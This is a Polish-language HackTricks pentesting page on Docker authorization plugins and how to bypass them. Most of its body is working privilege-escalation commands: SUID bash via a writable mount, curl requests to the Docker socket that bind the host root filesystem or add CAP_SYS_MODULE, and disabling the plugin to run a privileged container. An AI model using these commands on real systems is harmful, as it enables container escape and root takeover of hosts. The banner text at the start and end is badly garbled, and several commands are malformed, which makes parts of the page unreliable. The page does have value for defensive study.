{% hnnt styte=" acceas" %}
GCP Ha& practice ckinH: <img:<img src="/.gitbcok/ass.ts/agte.png"talb=""odata-siz/="line">[**HackTatckt T.aining AWS Red TelmtExp"rt (ARTE)**](ta-size="line">[**HackTricks Training GCP Re)Tmkg/stc="r.giebpokal"zee>/ttdt.png"isl=""data-ize="line">\
Learn & aciceGCP ngs<imgmsrc="/.gipbtok/aHsats/gcte.mag"y>lt="" aa-iz="le">[**angGC RedTamExper(GE)<img rc=".okaetgte.ng"al=""daa-siz="ne">tinhackth ckiuxyzcomurspssgr/a)

<dotsilp>

<oummpr>SupportHackTricks</smmay>

*Chek th [**subsrippangithub.cm/sorsarlosp!
* **Join the** 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** 🐦 [**@hahktcickr\_kivelive**](https://twitter.com/hacktr\icks\_live)**.**
* **Shareing tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}
{% endhint %}
{% endhint %}
{% endhint %}
{% endhint %}


**Model** **autoryzacji** **Docker** jest **wszystko albo nic**. Każdy użytkownik z uprawnieniami do dostępu do demona Docker może **wykonać dowolne** polecenie klienta Docker. To samo dotyczy wywołań korzystających z API silnika Docker do kontaktu z demonem. Jeśli potrzebujesz **większej kontroli dostępu**, możesz stworzyć **wtyczki autoryzacji** i dodać je do konfiguracji demona Docker. Korzystając z wtyczki autoryzacji, administrator Docker może **konfigurować szczegółowe polityki dostępu** do zarządzania dostępem do demona Docker.

# Podstawowa architektura

Wtyczki autoryzacji Docker to **zewnętrzne** **wtyczki**, które możesz wykorzystać do **zezwalania/odmawiania** **działań** żądanych do demona Docker **w zależności** od **użytkownika**, który je żąda, oraz **działania** **żądanego**.

**[Poniższe informacje pochodzą z dokumentacji](https://docs.docker.com/engine/extend/plugins_authorization/#:~:text=If%20you%20require%20greater%20access,access%20to%20the%20Docker%20daemon)**

Gdy **żądanie HTTP** jest wysyłane do demona Docker przez CLI lub za pośrednictwem API silnika, **podsystem** **uwierzytelniania** **przekazuje** żądanie do zainstalowanej **wtyczki uwierzytelniania**. Żądanie zawiera użytkownika (wywołującego) i kontekst polecenia. **Wtyczka** jest odpowiedzialna za podjęcie decyzji, czy **zezwolić** czy **odmówić** żądanie.

Poniższe diagramy sekwencji przedstawiają przepływ autoryzacji zezwalającej i odmawiającej:

![Authorization Allow flow](https://docs.docker.com/engine/extend/images/authz\_allow.png)

![Authorization Deny flow](https://docs.docker.com/engine/extend/images/authz\_deny.png)

Każde żądanie wysyłane do wtyczki **zawiera uwierzytelnionego użytkownika, nagłówki HTTP oraz ciało żądania/odpowiedzi**. Tylko **nazwa użytkownika** i **metoda uwierzytelniania** są przekazywane do wtyczki. Co najważniejsze, **żadne** dane **uwierzytelniające** użytkownika ani tokeny nie są przekazywane. Na koniec, **nie wszystkie ciała żądań/odpowiedzi są wysyłane** do wtyczki autoryzacji. Tylko te ciała żądań/odpowiedzi, w których `Content-Type` to `text/*` lub `application/json`, są wysyłane.

Dla poleceń, które mogą potencjalnie przejąć połączenie HTTP (`HTTP Upgrade`), takich jak `exec`, wtyczka autoryzacji jest wywoływana tylko dla początkowych żądań HTTP. Gdy wtyczka zatwierdzi polecenie, autoryzacja nie jest stosowana do reszty przepływu. W szczególności, dane strumieniowe nie są przekazywane do wtyczek autoryzacji. Dla poleceń, które zwracają odpowiedzi HTTP w kawałkach, takich jak `logs` i `events`, tylko żądanie HTTP jest wysyłane do wtyczek autoryzacji.

Podczas przetwarzania żądań/odpowiedzi, niektóre przepływy autoryzacji mogą wymagać dodatkowych zapytań do demona Docker. Aby zakończyć takie przepływy, wtyczki mogą wywoływać API demona podobnie jak zwykły użytkownik. Aby umożliwić te dodatkowe zapytania, wtyczka musi zapewnić środki dla administratora do skonfigurowania odpowiednich polityk uwierzytelniania i bezpieczeństwa.

## Kilka wtyczek

Jesteś odpowiedzialny za **rejestrowanie** swojej **wtyczki** jako część **uruchamiania** demona Docker. Możesz zainstalować **wiele wtyczek i połączyć je w łańcuch**. Ten łańcuch może być uporządkowany. Każde żądanie do demona przechodzi w kolejności przez łańcuch. Tylko gdy **wszystkie wtyczki przyznają dostęp** do zasobu, dostęp jest przyznawany.

# Przykłady wtyczek

## Twistlock AuthZ Broker

Wtyczka [**authz**](https://github.com/twistlock/authz) pozwala na stworzenie prostego pliku **JSON**, który wtyczka będzie **czytać**, aby autoryzować żądania. Dzięki temu masz możliwość bardzo łatwego kontrolowania, które punkty końcowe API mogą osiągnąć każdego użytkownika.

To jest przykład, który pozwoli Alicji i Bobowi na tworzenie nowych kontenerów: `{"name":"policy_3","users":["alice","bob"],"actions":["container_create"]}`

Na stronie [route\_parser.go](https://github.com/twistlock/authz/blob/master/core/route\_parser.go) możesz znaleźć relację między żądanym URL a działaniem. Na stronie [types.go](https://github.com/twistlock/authz/blob/master/core/types.go) możesz znaleźć relację między nazwą działania a działaniem.

## Prosty samouczek dotyczący wtyczek

Możesz znaleźć **łatwą do zrozumienia wtyczkę** z szczegółowymi informacjami na temat instalacji i debugowania tutaj: [**https://github.com/carlospolop-forks/authobot**](https://github.com/carlospolop-forks/authobot)

Przeczytaj `README` i kod `plugin.go`, aby zrozumieć, jak to działa.

# Ominięcie wtyczki autoryzacji Docker

## Wyliczanie dostępu

Główne rzeczy do sprawdzenia to **które punkty końcowe są dozwolone** i **które wartości HostConfig są dozwolone**.

Aby przeprowadzić tę enumerację, możesz **użyć narzędzia** [**https://github.com/carlospolop/docker\_auth\_profiler**](https://github.com/carlospolop/docker\_auth\_profiler)**.**

## niedozwolone `run --privileged`

### Minimalne uprawnienia
```bash
docker run --rm -it --cap-add=SYS_ADMIN --security-opt apparmor=unconfined ubuntu bash
```
### Uruchamianie kontenera, a następnie uzyskiwanie sesji z uprawnieniami

W tym przypadku administrator systemu **zabronił użytkownikom montowania wolumenów i uruchamiania kontenerów z flagą `--privileged`** lub nadawania jakichkolwiek dodatkowych uprawnień kontenerowi:
```bash
docker run -d --privileged modified-ubuntu
docker: Error response from daemon: authorization denied by plugin customauth: [DOCKER FIREWALL] Specified Privileged option value is Disallowed.
See 'docker run --help'.
```
Jednak użytkownik może **utworzyć powłokę wewnątrz działającego kontenera i nadać jej dodatkowe uprawnienia**:
```bash
docker run -d --security-opt seccomp=unconfined --security-opt apparmor=unconfined ubuntu
#bb72293810b0f4ea65ee8fd200db418a48593c1a8a31407be6fee0f9f3e4f1de

# Now you can run a shell with --privileged
docker exec -it privileged bb72293810b0f4ea65ee8fd200db418a48593c1a8a31407be6fee0f9f3e4f1de bash
# With --cap-add=ALL
docker exec -it ---cap-add=ALL bb72293810b0f4ea65ee8fd200db418a48593c1a8a31407be6fee0f9f3e4 bash
# With --cap-add=SYS_ADMIN
docker exec -it ---cap-add=SYS_ADMIN bb72293810b0f4ea65ee8fd200db418a48593c1a8a31407be6fee0f9f3e4 bash
```
Teraz użytkownik może uciec z kontenera, używając dowolnej z [**wcześniej omówionych technik**](./#privileged-flag) i **eskalować uprawnienia** wewnątrz hosta.

## Montowanie zapisywalnego folderu

W tym przypadku administrator systemu **zabronił użytkownikom uruchamiania kontenerów z flagą `--privileged`** lub nadawania jakiejkolwiek dodatkowej zdolności kontenerowi, a jedynie zezwolił na montowanie folderu `/tmp`:
```bash
host> cp /bin/bash /tmp #Cerate a copy of bash
host> docker run -it -v /tmp:/host ubuntu:18.04 bash #Mount the /tmp folder of the host and get a shell
docker container> chown root:root /host/bash
docker container> chmod u+s /host/bash
host> /tmp/bash
-p #This will give you a shell as root
```
{% hint style="info" %}
Zauważ, że być może nie możesz zamontować folderu `/tmp`, ale możesz zamontować **inny zapisywalny folder**. Możesz znaleźć zapisywalne katalogi używając: `find / -writable -type d 2>/dev/null`

**Zauważ, że nie wszystkie katalogi w maszynie linux będą wspierać bit suid!** Aby sprawdzić, które katalogi wspierają bit suid, uruchom `mount | grep -v "nosuid"` Na przykład zazwyczaj `/dev/shm`, `/run`, `/proc`, `/sys/fs/cgroup` i `/var/lib/lxcfs` nie wspierają bitu suid.

Zauważ również, że jeśli możesz **zamontować `/etc`** lub jakikolwiek inny folder **zawierający pliki konfiguracyjne**, możesz je zmienić z kontenera docker jako root, aby **wykorzystać je na hoście** i eskalować uprawnienia (może modyfikując `/etc/shadow`)
{% endhint %}

## Niezweryfikowany punkt końcowy API

Odpowiedzialnością administratora systemu konfigurowania tej wtyczki byłoby kontrolowanie, które akcje i z jakimi uprawnieniami każdy użytkownik może wykonywać. Dlatego, jeśli administrator przyjmie podejście **czarnej listy** z punktami końcowymi i atrybutami, może **zapomnieć o niektórych z nich**, co mogłoby pozwolić atakującemu na **eskalację uprawnień.**

Możesz sprawdzić API dockera w [https://docs.docker.com/engine/api/v1.40/#](https://docs.docker.com/engine/api/v1.40/#)

## Niezweryfikowana struktura JSON

### Binds w root

Możliwe, że gdy administrator systemu konfigurował zaporę docker, **zapomniał o niektórym ważnym parametrze** [**API**](https://docs.docker.com/engine/api/v1.40/#operation/ContainerList) takim jak "**Binds**".\
W poniższym przykładzie możliwe jest wykorzystanie tej błędnej konfiguracji do stworzenia i uruchomienia kontenera, który montuje folder root (/) hosta:
```bash
docker version #First, find the API version of docker, 1.40 in this example
docker images #List the images available
#Then, a container that mounts the root folder of the host
curl --unix-socket /var/run/docker.sock -H "Content-Type: application/json" -d '{"Image": "ubuntu", "Binds":["/:/host"]}' http:/v1.40/containers/create
docker start f6932bc153ad #Start the created privileged container
docker exec -it f6932bc153ad chroot /host bash #Get a shell inside of it
#You can access the host filesystem
```
{% hint style="warning" %}
Zauważ, że w tym przykładzie używamy parametru **`Binds`** jako klucza na poziomie root w JSON, ale w API pojawia się pod kluczem **`HostConfig`**
{% endhint %}

### Binds w HostConfig

Postępuj zgodnie z tymi samymi instrukcjami jak w przypadku **Binds w root**, wykonując to **żądanie** do API Dockera:
```bash
curl --unix-socket /var/run/docker.sock -H "Content-Type: application/json" -d '{"Image": "ubuntu", "HostConfig":{"Binds":["/:/host"]}}' http:/v1.40/containers/create
```
### Mounts in root

Postępuj zgodnie z tymi samymi instrukcjami co w przypadku **Binds in root**, wykonując to **żądanie** do API Dockera:
```bash
curl --unix-socket /var/run/docker.sock -H "Content-Type: application/json" -d '{"Image": "ubuntu-sleep", "Mounts": [{"Name": "fac36212380535", "Source": "/", "Destination": "/host", "Driver": "local", "Mode": "rw,Z", "RW": true, "Propagation": "", "Type": "bind", "Target": "/host"}]}' http:/v1.40/containers/create
```
### Mounts w HostConfig

Postępuj zgodnie z tymi samymi instrukcjami co w **Binds w root**, wykonując to **żądanie** do API Dockera:
```bash
curl --unix-socket /var/run/docker.sock -H "Content-Type: application/json" -d '{"Image": "ubuntu-sleep", "HostConfig":{"Mounts": [{"Name": "fac36212380535", "Source": "/", "Destination": "/host", "Driver": "local", "Mode": "rw,Z", "RW": true, "Propagation": "", "Type": "bind", "Target": "/host"}]}}' http:/v1.40/containers/cre
```
## Unchecked JSON Attribute

Możliwe, że gdy administrator systemu konfigurował zaporę docker, **zapomniał o niektórym ważnym atrybucie parametru** [**API**](https://docs.docker.com/engine/api/v1.40/#operation/ContainerList) takim jak "**Capabilities**" wewnątrz "**HostConfig**". W poniższym przykładzie możliwe jest wykorzystanie tej błędnej konfiguracji do stworzenia i uruchomienia kontenera z uprawnieniem **SYS\_MODULE**:
```bash
docker version
curl --unix-socket /var/run/docker.sock -H "Content-Type: application/json" -d '{"Image": "ubuntu", "HostConfig":{"Capabilities":["CAP_SYS_MODULE"]}}' http:/v1.40/containers/create
docker start c52a77629a9112450f3dedd1ad94ded17db61244c4249bdfbd6bb3d581f470fa
docker ps
docker exec -it c52a77629a91 bash
capsh --print
#You can abuse the SYS_MODULE capability
```
{% hint style="info" %}
**`HostConfig`** jest kluczem, który zazwyczaj zawiera **interesujące** **uprawnienia** do ucieczki z kontenera. Jednak, jak wcześniej omówiliśmy, zauważ, że użycie Binds poza nim również działa i może pozwolić na obejście ograniczeń.
{% endhint %}

## Wyłączanie wtyczki

Jeśli **sysadmin** **zapomniał** **zabronić** możliwości **wyłączenia** **wtyczki**, możesz to wykorzystać, aby całkowicie ją wyłączyć!
```bash
docker plugin list #Enumerate plugins

# If you don’t have access to enumerate the plugins you can see the name of the plugin in the error output:
docker: Error response from daemon: authorization denied by plugin authobot:latest: use of Privileged containers is not allowed.
# "authbolt" is the name of the previous plugin

docker plugin disable authobot
docker run --rm -it --privileged -v /:/host ubuntu bash
docker plugin enable authobot
```
Pamiętaj, aby **ponownie włączyć wtyczkę po eskalacji**, w przeciwnym razie **ponowne uruchomienie usługi docker nie zadziała**!

## Opisy obejścia wtyczki autoryzacji

* [https://staaldraad.github.io/post/2019-07-11-bypass-docker-plugin-with-containerd/](https://staaldraad.github.io/post/2019-07-11-bypass-docker-plugin-with-containerd/)

## Odniesienia
{% hnt stye="acceas" %}
AWS Ha& practice ckinH:<img :<imgsscc="/.gitb=ok/assgts/aite.png"balo=""kdata-siza="line">[**HackTsscke Tpaigin"aAWS Red Tetm=Exp rt (ARTE)**](a-size="line">[**HackTricks Training AWS Red)ethgasic="..giyb/okseasert/k/.png"l=""data-ize="line">\
Learn & aciceGCP ng<imgsrc="/.gibok/asts/gte.g"lt="" aa-iz="le">[**angGC RedTamExper(GE)<img rc=".okaetgte.ng"salm=""adara-siz>="k>ne">tinhaktckxyzurssgr)

<dtil>

<ummr>SupportHackTricks</smmay>

*Chek th [**subsrippangithub.cm/sorsarlosp!
* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!haktick\_ive\
* **Join  💬 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

{% endhint %}
</details>
{% endhint %}
</details>
{% endhint %}
</details>
{% endhint %}
</details>
{% endhint %}
